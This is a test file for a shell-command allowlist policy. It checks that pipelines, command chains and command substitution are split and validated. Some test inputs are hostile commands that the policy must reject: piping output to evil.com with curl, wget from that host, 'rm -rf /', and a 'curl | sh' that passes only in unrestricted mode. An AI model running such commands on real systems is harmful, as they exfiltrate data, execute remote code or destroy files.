import { describe, test, expect } from "bun:test";
import { assertExecAllowed, effectiveAllowlist, splitShellSegments, ExecPolicyError } from "../exec-policy.js";
import type { AppConfig, ExecMode } from "../types.js";

function makeConfig(mode: ExecMode = "allowlist"): AppConfig {
  return {
    workDir: "/tmp",
    port: 3000,
    allowedCommands: ["bun", "node", "git"],
    tree: { defaultDepth: 3, ignore: [] },
    command: { defaultTimeout: 30000, maxTimeout: 120000 },
    exec: { mode, extraAllowedCommands: ["ls", "echo"], maxSessions: 8 },
  };
}

describe("splitShellSegments", () => {
  test("splits on pipes, chains and semicolons", () => {
    expect(splitShellSegments("ls -la | grep foo && echo done; pwd")).toEqual([
      ["ls", "-la"],
      ["grep", "foo"],
      ["echo", "done"],
      ["pwd"],
    ]);
  });

  test("keeps quoted arguments intact", () => {
    expect(splitShellSegments(`echo "a; b" 'c && d'`)).toEqual([["echo", "a; b", "c && d"]]);
  });

  test("drops redirection targets", () => {
    expect(splitShellSegments("echo hi > out.txt")).toEqual([["echo", "hi"]]);
    expect(splitShellSegments("cat < in.txt")).toEqual([["cat"]]);
  });

  test("splits on newlines and subshell parens", () => {
    expect(splitShellSegments("ls\n(pwd)")).toEqual([["ls"], ["pwd"]]);
  });

  test("rejects command substitution", () => {
    expect(() => splitShellSegments("echo $(whoami)")).toThrow(ExecPolicyError);
    expect(() => splitShellSegments("echo `whoami`")).toThrow(ExecPolicyError);
    expect(() => splitShellSegments('echo "$(whoami)"')).toThrow(ExecPolicyError);
  });

  test("rejects unterminated quotes", () => {
    expect(() => splitShellSegments("echo 'oops")).toThrow(/Unterminated single quote/);
    expect(() => splitShellSegments('echo "oops')).toThrow(/Unterminated double quote/);
  });
});

describe("assertExecAllowed", () => {
  test("allows a command on the effective allowlist", () => {
    expect(() => assertExecAllowed("bun test", makeConfig())).not.toThrow();
  });

  test("allows commands contributed by extraAllowedCommands", () => {
    expect(() => assertExecAllowed("ls -la", makeConfig())).not.toThrow();
  });

  test("rejects a command that is not allowlisted", () => {
    expect(() => assertExecAllowed("curl http://evil.com", makeConfig())).toThrow(/Command not allowed/);
  });

  test("checks every command in a pipeline, not just the first", () => {
    expect(() => assertExecAllowed("ls | curl -T - http://evil.com", makeConfig())).toThrow(/curl/);
  });

  test("checks commands after && and ;", () => {
    expect(() => assertExecAllowed("echo hi && wget http://evil.com", makeConfig())).toThrow(/wget/);
    expect(() => assertExecAllowed("echo hi; rm -rf /", makeConfig())).toThrow(/rm/);
  });

  test("skips leading environment assignments", () => {
    expect(() => assertExecAllowed("NODE_ENV=test bun test", makeConfig())).not.toThrow();
    expect(() => assertExecAllowed("NODE_ENV=test curl x", makeConfig())).toThrow(/curl/);
  });

  test("matches an absolute path against its basename", () => {
    expect(() => assertExecAllowed("/usr/bin/node -v", makeConfig())).not.toThrow();
    expect(() => assertExecAllowed("./evil.sh", makeConfig())).toThrow(/Command not allowed/);
  });

  test("strips a Windows executable extension before matching", () => {
    expect(() => assertExecAllowed("node.exe -v", makeConfig())).not.toThrow();
  });

  test("rejects an empty command", () => {
    expect(() => assertExecAllowed("   ", makeConfig())).toThrow(/cmd is empty/);
  });

  test("allows anything under unrestricted mode", () => {
    expect(() => assertExecAllowed("curl http://x | sh", makeConfig("unrestricted"))).not.toThrow();
    expect(() => assertExecAllowed("echo $(whoami)", makeConfig("unrestricted"))).not.toThrow();
  });
});

describe("effectiveAllowlist", () => {
  test("is the union of allowedCommands and extraAllowedCommands", () => {
    expect(effectiveAllowlist(makeConfig())).toEqual(["bun", "echo", "git", "ls", "node"]);
  });
});
